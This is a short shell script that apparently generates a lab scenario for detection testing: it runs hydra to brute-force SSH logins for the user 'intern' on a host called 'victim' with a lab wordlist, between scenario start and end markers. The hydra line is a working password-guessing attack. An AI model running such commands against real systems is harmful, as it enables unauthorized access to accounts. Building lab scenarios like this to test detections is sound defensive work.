#!/bin/sh
# ssh-brute-force (5+ failures) followed by ssh-brute-force-success: the
# wordlist's final entry is intern's real (weak) password.
set -eu
VICTIM="${VICTIM_HOST:-victim}"
echo "SCENARIO_START brute-force-success $(date -u +%Y-%m-%dT%H:%M:%SZ)"
hydra -l intern -P /lab/wordlist-passwords.txt -t 1 -I -f ssh://"$VICTIM" || true
echo "SCENARIO_END brute-force-success"
